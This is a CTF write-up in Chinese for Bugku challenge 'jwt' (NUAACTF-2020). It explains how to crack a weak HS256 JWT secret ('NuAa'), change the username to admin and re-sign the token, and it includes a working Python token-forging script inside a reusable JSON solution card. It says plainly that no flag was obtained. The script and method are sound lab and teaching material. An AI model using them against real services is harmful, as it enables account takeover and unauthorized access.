# 第34题：jwt

## 基本信息
- 平台：Bugku CTF
- 题库URL：https://ctf.bugku.com/challenges/index/gid/2/tid/1/status/-1.html
- 全局题号：第34题
- 题目名称：jwt
- 题目类型：WEB
- 所属赛事：NUAACTF-2020
- 题目链接：https://ctf.bugku.com/challenges/detail/id/544.html
- 是否有附件：否
- 附件类型：无

## 题面
nuaactf{}

## 分析过程
该题是 JWT 弱密钥伪造题。Bugku 详情页公开评论给出关键线索：使用 c-jwt-cracker 破解 JWT，得到 4 位 secret key `NuAa`；之后在 jwt.io 中把注册名改成 admin，用 `NuAa` 重新签名，再把新 JWT 写回 cookie，访问个人中心即可。

当前无法在本环境启动 Bugku 动态场景，因此不能取得场景内实际 JWT，也不能提交验证最终 flag。为避免编造 flag，本题先沉淀为 blocked 状态和通用 JWT 伪造能力卡。

## 解题步骤
1. 启动场景后注册一个普通账号并登录。
2. 从 Cookie 或 Authorization 头中取出 JWT。
3. 使用 `c-jwt-cracker` 或字典脚本爆破 HS256 secret。
4. 将 payload 中的用户名、role 或身份字段改为 `admin`。
5. 用 secret `NuAa` 重新签名 JWT。
6. 替换原 JWT，访问个人中心或 admin 页面读取 flag。

## 使用工具和命令
```bash
c-jwt-cracker '<jwt>'
python3 jwt_weak_secret_forge.py '<jwt>' NuAa '{"username":"admin"}'
```

## 结果
flag：未取得最终 flag（需动态场景复现）。

## 可复用性判断
- 是否可复用：是
- 可复用技法：弱密钥 JWT 爆破后修改身份字段并重签名。
- 是否需要写 solver：是
- 是否产生 artifact：否

## blocked 情况
- blocked：是
- 卡住原因：当前环境无法启动/访问 Bugku 动态场景，无法取得实际 JWT 和最终 flag。
- 已尝试方法：检索 Bugku 题目页、比赛真题 WEB 列表和公开评论线索。
- 下一步建议：启动场景后按上述步骤复现，将最终 flag 补入 `verification.flag`。

## JSON 解法转化卡
```json
{
  "title": "jwt",
  "source_id": "[Bugku] 第34题",
  "capability_id": "",
  "category": "web",
  "attachment_type": "无",
  "detection": {
    "keywords": [
      "bugku",
      "web",
      "jwt",
      "CTF",
      "比赛真题",
      "网页",
      "token",
      "弱密钥",
      "伪造"
    ],
    "attachment_features": "无附件；动态 Web 场景题",
    "condition": "题面或列表出现 jwt，且为 Bugku 比赛真题 WEB 动态场景题时适用。"
  },
  "method": {
    "principle": "对弱密钥签名的 JWT 进行密钥爆破和身份字段重签名伪造。",
    "steps": [
      "注册普通用户并获取 JWT cookie",
      "用 c-jwt-cracker 或字典爆破 HS256 secret",
      "将 payload 中用户名/身份字段改为 admin",
      "用密钥重签名后替换 cookie，访问个人中心读取 flag"
    ],
    "tools": [
      "c-jwt-cracker",
      "jwt.io",
      "python3 pyjwt"
    ],
    "produces_artifact": false
  },
  "solver": {
    "reusable": true,
    "module_name": "jwt_weak_secret_forge",
    "code": "import sys, json, hmac, hashlib, base64\n\ndef b64u_dec(s):\n    s += '=' * (-len(s) % 4)\n    return base64.urlsafe_b64decode(s.encode())\n\ndef b64u_enc(b):\n    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()\n\ndef sign(h, p, secret):\n    msg = (h + '.' + p).encode()\n    return b64u_enc(hmac.new(secret.encode(), msg, hashlib.sha256).digest())\n\nif len(sys.argv) < 4:\n    print(\"usage: python jwt_weak_secret_forge.py <jwt> <secret> '<json_patch>'\")\n    sys.exit(1)\n\ntok, secret, patch = sys.argv[1], sys.argv[2], json.loads(sys.argv[3])\nh, p, s = tok.split('.')\npayload = json.loads(b64u_dec(p))\npayload.update(patch)\nnew_p = b64u_enc(json.dumps(payload, separators=(',', ':')).encode())\nprint(h + '.' + new_p + '.' + sign(h, new_p, secret))\n",
    "input": "动态场景 JWT、secret 和需要覆盖的 JSON 字段。",
    "output": "重签名后的 JWT。"
  },
  "verification": {
    "flag": "",
    "how": "启动 Bugku 场景后运行：python3 jwt_weak_secret_forge.py '<jwt>' NuAa '{\"username\":\"admin\"}'；替换 cookie 后访问个人中心。"
  }
}
```
